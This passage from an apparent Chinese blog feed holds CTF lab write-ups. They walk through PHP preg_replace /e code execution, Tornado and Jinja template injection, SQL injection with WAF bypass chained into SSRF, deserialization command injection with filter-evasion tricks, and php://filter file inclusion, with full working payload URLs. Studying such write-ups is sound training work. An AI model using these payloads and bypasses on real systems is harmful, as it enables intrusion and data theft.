class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;i = <span class="number">0</span>;j = tab.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        k = j + (l) + (n=<span class="number">0</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        n = tab2.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        o = tab[i-l];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        pass = p;<span class="keyword">return</span> pass;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>String[“fromCharCode”]接收Unicode值，组合成一个新字符串<br>解码String[“fromCharCode”](dechiffre[])中的十六进制字符串<br>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">55,56,54,79,115,69,114,116,107,49,50</span><br></pre></td></tr></table></figure><p>对比ASCII表得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7,8,6,O,s,E,r,t,k,1,2</span><br></pre></td></tr></table></figure><p>猜测dechiffre里的pass也是ACSII编码，解密后恰是FAUX PASSWORD HAHA<br>且函数不管输入什么一直返回pass-FAUX PASSWORD HAHA</p><p>题目给了flag的格式为Cyberpeace{xxxxxxxxx}<br>所以猜测flag其实是Cyberpeace{786OsErtk12}<br>成功提交</p><h2 id="5-ics-05-NO-GFSJ0332"><a href="#5-ics-05-NO-GFSJ0332" class="headerlink" title="5.ics-05-NO.GFSJ0332"></a>5.ics-05-NO.GFSJ0332</h2><p>访问页面查了下源码，发现只有index.php一个php文件<br>访问后点击云平台设备维护中心<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181523046.png"><br>尝试用page去读index.php,直接读不行用伪协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61269/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>解码后<br>其中有preg_replace,可以尝试使用&#x2F;&#x2F;e匹配执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61269/index.php?pat=/haha/e&amp;rep=phpinfo()&amp;sub=haha</span><br></pre></td></tr></table></figure><p>抓包，加入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>成功执行<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181548625.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61269/index.php?pat=/haha/e&amp;rep=system(&#x27;ls&#x27;)&amp;sub=haha</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181551079.png"><br>查看sechahahaDir下发现存在flag文件夹,flag文件夹里有flag.php<br>查看flag.php得到flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181554265.png"></p><h2 id="6-easytornado-NO-GFSJ0723"><a href="#6-easytornado-NO-GFSJ0723" class="headerlink" title="6.easytornado-NO.GFSJ0723"></a>6.easytornado-NO.GFSJ0723</h2><p>flag.txt &#x3D;&gt; flag文件 &#x2F;fllllllllllllag<br>hints.txt &#x3D;&gt; md5(cookie_secret+md5(filename))</p><p>Tornado 是非阻塞式快速服务器<br>存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 文件读取漏洞</span><br><span class="line">2. 模板注入漏洞</span><br><span class="line">3. 跨站攻击,伪造cookie</span><br></pre></td></tr></table></figure><p>先测是否存在模板注入<br>网上查到tornado模板存在一些可访问的快速对象如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure><p>跳到error页面<br>尝试让msg&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>,成功读出cookie_secret</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;c4a4a033-ffb3-4991-bffd-7a96b7e8fc1a&#x27;&#125;</span><br></pre></td></tr></table></figure><p>通过hints.txt构造&#x2F;fllllllllllllag的filehash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e617a328fadf4169c1e85c45c42d8c19</span><br><span class="line">访问</span><br><span class="line">http://61.147.171.105:59636/file?filename=/fllllllllllllag&amp;filehash=e617a328fadf4169c1e85c45c42d8c19</span><br></pre></td></tr></table></figure><p>成功读取到flag</p><h2 id="7-shrine-NO-GFSJ0724"><a href="#7-shrine-NO-GFSJ0724" class="headerlink" title="7.shrine-NO.GFSJ0724"></a>7.shrine-NO.GFSJ0724</h2><p>访问&#x2F;得到源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line"><span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>尝试访问&#x2F;shrine&#x2F;发现失败,尝试模板注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56178/shrine/%7B%7B1+1%7D%7D</span><br></pre></td></tr></table></figure><p>被成功执行</p><p>FLAG被写在config文件中,但<br>()被过滤想找类掉用函数几乎不可能</p><p>看了大佬的wp:<br>借助current_app, 这是全局变量代理,查看其config即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>找到flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181614290.png"></p><h2 id="8-fakebook-NO-GFSJ0726"><a href="#8-fakebook-NO-GFSJ0726" class="headerlink" title="8.fakebook-NO.GFSJ0726"></a>8.fakebook-NO.GFSJ0726</h2><p>访问robots.txt<br>发现Disallow: &#x2F;user.php.bak<br>访问下载user.php备份文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get函数存在ssrf</p><p>创建用户后访问用户界面猜测存在sql注入<br>通过order by 试出来有4列<br>尝试联合注入,发现有waf<br>通过/**/绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,2,3,4%20--+</span><br></pre></td></tr></table></figure><p>发现2是注入点<br>爆表名&#x3D;&gt; users</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27),3,4%20--+</span><br></pre></td></tr></table></figure><p>爆列名&#x3D;&gt;no, username,passwd,data</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27fakebook%27%20and%20table_name=%27users%27),3,4%20--+</span><br></pre></td></tr></table></figure><p>查data，发现用户数据以序列化形式存于数据库中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">11</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;test.com&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,(select%20group_concat(data)%20from%20users%20),3,4%20--+</span><br></pre></td></tr></table></figure><p>我们从后台查看数据时,首先从数据库中提取出序列化字符串,再将其反序列化,<br>对反序列化后的对象提取出博客的链接,在利用curl去访问该链接</p><p>所以我们借助联合注入,在第四位data构造恶意ssrf读取flag.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;xrect1fy&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">114514</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$xrect1fy</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$xrect1fy</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>联合注入data位传入payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:8:%22xrect1fy%22;s:3:%22age%22;i:114514;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%20%27%20--+</span><br></pre></td></tr></table></figure><p>iframe的src<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181656444.png"><br>访问源码即是flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181656064.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界练习-CTF入门(一)</title>
      <link href="/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8/"/>
      <url>/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-难度一"><a href="#1-难度一" class="headerlink" title="1.难度一"></a>1.难度一</h1><h2 id="1-unseping-NO-GFSJ1061"><a href="#1-unseping-NO-GFSJ1061" class="headerlink" title="1.unseping-NO.GFSJ1061"></a>1.unseping-NO.GFSJ1061</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">    <span class="comment">#回调函数</span></span><br><span class="line">    <span class="comment">#第一个参数是函数名,第二个参数是参数</span></span><br><span class="line">    <span class="comment">#第一个参数是ping,第二个参数是执行命令</span></span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"> <span class="comment">#命令执行函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#匹配str中的关键信息</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//循环遍历args数组,对args的每个值都调用waf函数过一遍</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST方式传入ctf</span></span><br><span class="line"><span class="comment">#对ctf进行反序列化</span></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ease类有2个参数method和args</p><p>传入ctf字符串后<br>ctf字符串-&gt;base64解码-&gt;__construct构造函数-&gt;__wakeup调用waf函数过滤str-&gt;__destruct-&gt;调用ping函数,通过ease执行命令</p><p>构造字符串测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;ifconfig&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果成功执行ifconfig:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170941382.png"></p><p>由于屏蔽ls<br>则使用单引号绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;l&#x27;s&#x27;&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170942970.png"></p><p>查看flag_1s_here文件夹下的内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;l&quot;&quot;s$&#123;IFS&#125;f&quot;&quot;lag_1s_here&#x27;</span>));</span><br></pre></td></tr></table></figure><p>此处屏蔽空格,使用${IFS}绕过,由于双引号会解析${}中的内容,所以使用单引号构造字符串<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170943593.png"></p><p>用cat查看flag_1s_here下的php文件<br>由于/被屏蔽<br>使用printf绕过</p><p>printf(字符串进制绕过)<br>linux下可以用``执行命令<br>从而构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;c&quot;&quot;at$&#123;IFS&#125;f&quot;&quot;lag_1s_here`printf$&#123;IFS&#125;&quot;\57&quot;`f&quot;&quot;lag_831b69012c67b35f.p&quot;&quot;hp&#x27;</span>));</span><br></pre></td></tr></table></figure><p>拿到key<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170944987.png"></p><h2 id="2-file-include-NO-GFSJ1060"><a href="#2-file-include-NO-GFSJ1060" class="headerlink" title="2.file_include-NO.GFSJ1060"></a>2.file_include-NO.GFSJ1060</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>让filename&#x3D;flag.php发现没有回显<br>尝试用伪协议读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>回显do not hack 推测出有关键词被屏蔽<br>经过测试,发现为read,base64,encode<br>convert.base64-encode是对内容编码操作,替换为其他不带有encode的过滤器<br>例如使用压缩过滤器convert.iconv.**<br>convert.iconv.&lt;input-encoding&gt;&lt;output-encoding&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php</span><br></pre></td></tr></table></figure><p><img 